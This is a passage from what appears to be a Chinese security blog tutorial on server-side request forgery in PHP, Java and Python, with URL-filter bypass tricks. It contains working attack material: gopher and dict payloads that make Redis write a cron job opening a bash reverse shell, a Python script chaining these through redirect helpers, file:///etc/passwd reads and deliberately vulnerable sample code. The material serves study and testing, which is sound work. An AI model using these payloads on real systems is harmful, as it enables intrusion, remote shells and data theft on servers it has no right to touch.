&apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure><p>当需要更换IP和端口时，命令中的<code>$57</code>需要同时更改，因为<code>$57</code>表示的是exp字符串长度为57个字节，上面的exp即<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a</code>这段字符串URL解码后的长度为57。</p><p>这部分在下面的远程利用中会具体讲到。</p><h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><p>网上找的SSRF题目代码跑下就好。远程利用分为回显型和无回显型。</p><p>s1.php，未做任何SSRF防御，且有回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    <span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用exp，比较简单，就不贴图了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.137/s1.php?url=file:///etc/passwd</span><br><span class="line">http://192.168.10.137/s1.php?url=dict://127.0.0.1:6379/info</span><br><span class="line">http://192.168.10.137/s1.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a</span><br><span class="line"></span><br><span class="line"># Windows下file://协议有点区别</span><br><span class="line">http://192.168.10.137/s1.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure><p>s2.php，限制协议为HTTP/HTTPS，且设置跳转重定向为True（默认不跳转）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时使用dict、gopher等协议已经不能像上一个题目一样直接同理，但是还可以利用302跳转的方式来绕过http/https协议限制。</p><h4 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h4><p>Redis定时任务反弹shell语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h5 id="通过Gopher协议实现"><a href="#通过Gopher协议实现" class="headerlink" title="通过Gopher协议实现"></a>通过Gopher协议实现</h5><p>Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码。</p><p>具体Gopher协议报文的构造可参考Joychou的博客：<a href="https://joychou.org/web/phpssrf.html#directory0418754728965590855" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#directory0418754728965590855</a></p><h5 id="通过Dict协议实现"><a href="#通过Dict协议实现" class="headerlink" title="通过Dict协议实现"></a>通过Dict协议实现</h5><p>这部分引用自：<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p><blockquote><p>dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行redis getshell的exp，执行完就能达到和gopher一样的效果。原理一样，但是gopher只需要一个url请求即可，dict需要步步构造。</p><p>利用猪猪侠的wooyun上公开的脚本改成适配本文的脚本ssrf.py：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host = <span class="string">'104.224.151.234'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line">bhost = <span class="string">'www.4o4notfound.org'</span></span><br><span class="line">bport=<span class="number">2333</span></span><br><span class="line">vul_httpurl = <span class="string">'http://www.4o4notfound.org/ssrf.php?url='</span></span><br><span class="line">_location = <span class="string">'http://www.4o4notfound.org/302.php'</span></span><br><span class="line">shell_location = <span class="string">'http://www.4o4notfound.org/shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format( host = host,</span><br><span class="line"> port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#set crontab command</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=</span></span><br><span class="line"><span class="string">&#123;bport&#125;'</span>.format( host = host, port = port, bhost = bhost, bport = bport)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(shell_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri </span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#confg set dir</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dir:/var/spool/cron/'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#config set dbfilename</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#save</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save'</span>.format( host = host, port</span><br><span class="line"> = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br></pre></td></tr></table></figure><blockquote><p>因为curl默认不支持302跳转，而该脚本要用到302跳转，所以需要在ssrf.php中加上一行“curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)”来支持跳转。302.php代码为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/$data"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>shell.php主要用于写入用于反弹shell的crontab的定时任务，代码为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$bhost = $_GET[<span class="string">'bhost'</span>];</span><br><span class="line">$bport = $_GET[<span class="string">'bport'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-</span></span><br><span class="line"><span class="string">i\\x20&amp;gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&amp;gt;\\x261\\x0a\\x0a\\x0a\""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>执行ssrf.py,即可在/var/spool/cron/下写入定时任务，反弹shell，nc等待接收shell。</p></blockquote><h4 id="攻击本地PHP-FPM"><a href="#攻击本地PHP-FPM" class="headerlink" title="攻击本地PHP-FPM"></a>攻击本地PHP-FPM</h4><p>SSRF打本地PHP-FPM在之前的博文中有讲过：<a href="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/#0x05-SSRF%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0PHP-FPM">《浅谈PHP-FPM安全》</a></p><p>本次的Gopher协议攻击报文是直接通过脚本生成的。</p><h2 id="0x02-SSRF-in-Java"><a href="#0x02-SSRF-in-Java" class="headerlink" title="0x02 SSRF in Java"></a>0x02 SSRF in Java</h2><h3 id="可利用的协议-1"><a href="#可利用的协议-1" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>由于Java没有PHP的cURL，因此不能像PHP一样可以通过<code>curl -V</code>来查看支持的协议，这里我们可以使用<code>import sun.net.www.protocol</code>来查看支持哪些协议：</p><p><img src="/2020/02/29/SSRF-Tricks小结/4.png" alt=""></p><p>可以看到是支持file、ftp、http/https、jar、mailto、netdoc等协议的。</p><p>而实际上有攻击利用价值的仅为file和http/https协议。</p><h3 id="SSRF相关类"><a href="#SSRF相关类" class="headerlink" title="SSRF相关类"></a>SSRF相关类</h3><p>Java中能发起网络请求的类：</p><ul><li>HttpClient类</li><li>HttpURLConnection类</li><li>URLConnection类</li><li>URL类</li><li>OkHttp类</li><li>ImageIO类</li><li>Request类</li></ul><p>注意：Request是对HttpClient类进行了封装的类，类似于Python的requests库。其用法简单，一行代码就能获取网页内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request.Get(url).execute().returnContent().toString();</span><br></pre></td></tr></table></figure><p>其中，仅支持HTTP/HTTPS协议的类（即类名或封装的类名带http）：</p><ul><li>HttpClient类</li><li>HttpURLConnection类</li><li>OkHttp类</li><li>Request类</li></ul><p>支持<code>sun.net.www.protocol</code>所有协议的类：</p><ul><li>URLConnection类</li><li>URL类</li><li>ImageIO类</li></ul><h3 id="漏洞示例代码"><a href="#漏洞示例代码" class="headerlink" title="漏洞示例代码"></a>漏洞示例代码</h3><p>本部分引自：<a href="https://pplsec.github.io/2018/09/19/JAVA代码审计之XXE与SSRF/" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF</a></p><p>环境搭建可使用这个项目，这里就不演示了：<a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p><h4 id="HttpURLConnection类"><a href="#HttpURLConnection类" class="headerlink" title="HttpURLConnection类"></a>HttpURLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//HttpURLConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpUrl.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = <span class="keyword">new</span> StringBuffer(); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure><h4 id="URLConnection类"><a href="#URLConnection类" class="headerlink" title="URLConnection类"></a>URLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//urlConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure><h4 id="ImageIO类"><a href="#ImageIO类" class="headerlink" title="ImageIO类"></a>ImageIO类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ImageIO ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); <span class="comment">// 发起请求,触发漏洞</span></span><br></pre></td></tr></table></figure><h4 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Request漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">return</span> Request.Get(url).execute().returnContent().toString();<span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// openStream漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">inputStream = u.openStream();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OkHttpClient漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = <span class="keyword">new</span> com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// HttpClients漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); <span class="comment">//发起请求</span></span><br></pre></td></tr></table></figure><h3 id="特有jar-协议分析"><a href="#特有jar-协议分析" class="headerlink" title="特有jar://协议分析"></a>特有jar://协议分析</h3><p>jar://协议能从远程获取jar文件及解压得到其中的内容，其格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&lt;url&gt;!/&#123;entry&#125;</span><br></pre></td></tr></table></figure><p>实例如下，<code>!</code>符号后面就是其需要从中解压出的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://a.com/b.jar!/file/within/the/zip</span><br></pre></td></tr></table></figure><p>jar://协议分类：</p><ul><li>Jar file（Jar包本身）：<code>jar:http://www.foo.com/bar/baz.jar!/</code></li><li>Jar entry（Jar包中某个资源文件）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/a.class</code></li><li>Jar directory（Jar包中某个目录）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/</code></li></ul><p>其实目前jar://协议在Java SSRF中的利用一般是获取目标jar包中的文件内容，比如某个类，其并不像其他常用的攻击协议一样能够对内网服务发起攻击。</p><p>比如下面的poc是获取目标jar包内C3P0.class文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/MySSRF/ssrf2?url=jar:http://127.0.0.1/ysoserial.jar!/ysoserial/payloads/C3P0.class</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/5.png" alt=""></p><p>这样就能看到jar包中的任何内容，如果jar包还是开发者自定义的话就会造成源码泄露，但是这个协议的利用还是很鸡肋。</p><h3 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h3><p>参考Vulhub的环境：<a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p><h2 id="0x03-SSRF-in-Python"><a href="#0x03-SSRF-in-Python" class="headerlink" title="0x03 SSRF in Python"></a>0x03 SSRF in Python</h2><p>SSRF在Python中也是一样的，漏洞点都是发起URL请求的函数的参数外部可控导致SSRf漏洞。最为经典的就是和urllib的CRLF注入漏洞的结合利用，可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h2 id="0x04-URL地址过滤Bypass"><a href="#0x04-URL地址过滤Bypass" class="headerlink" title="0x04 URL地址过滤Bypass"></a>0x04 URL地址过滤Bypass</h2><p>如今，大多数站点都对存在SSRF风险的地方的URL参数进行了过滤，但开发者的水平参差不齐，会存在一些可被绕过的场景。</p><h3 id="符绕过URL白名单"><a href="#符绕过URL白名单" class="headerlink" title="@符绕过URL白名单"></a>@符绕过URL白名单</h3><p>有时候后台程序会以白名单的方式校验输入的URL参数是否为白名单中的域名或IP，但如果只校验如是否以<code>http://a.com</code>开头，则可以通过<code>@</code>符进行绕过：<code>http://a.com@10.10.10.100</code></p><p>而此时实际访问的是<code>http://10.10.10.100</code>。</p><h3 id="IP地址进制转换绕过"><a href="#IP地址进制转换绕过" class="headerlink" title="IP地址进制转换绕过"></a>IP地址进制转换绕过</h3><p>通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如：</p><ul><li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</code></li><li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li><li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li></ul><p>此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>16进制整数格式：0xC0A80001</li><li>10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式）</li></ul><p>其他特殊形式：</p><ul><li>10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作；</li><li>0.0.0.0可以直接访问到本地；</li></ul><h3 id="通过xip-io解析到内网绕过"><a href="#通过xip-io解析到内网绕过" class="headerlink" title="通过xip.io解析到内网绕过"></a>通过xip.io解析到内网绕过</h3><p>这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的：</p><ul><li>10.0.0.1.xip.io</li><li><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></li><li>mysite.10.0.0.1.xip.io</li><li>foo.bar.10.0.0.1.xip.io</li></ul><h3 id="利用IPv6绕过"><a href="#利用IPv6绕过" class="headerlink" title="利用IPv6绕过"></a>利用IPv6绕过</h3><blockquote><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code>或IPv6的内网域名来绕过过滤。</p></blockquote><h3 id="利用IDN绕过"><a href="#利用IDN绕过" class="headerlink" title="利用IDN绕过"></a>利用IDN绕过</h3><blockquote><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p></blockquote><h3 id="利用30x跳转绕过"><a href="#利用30x跳转绕过" class="headerlink" title="利用30x跳转绕过"></a>利用30x跳转绕过</h3><blockquote><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p><p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1" target="_blank" rel="noopener">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p><p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p></blockquote><p>跳转常见的结合协议的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: file://etc/passwd"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: dict://127.0.0.1:666/info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: gopher://127.0.0.1:666/_info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" 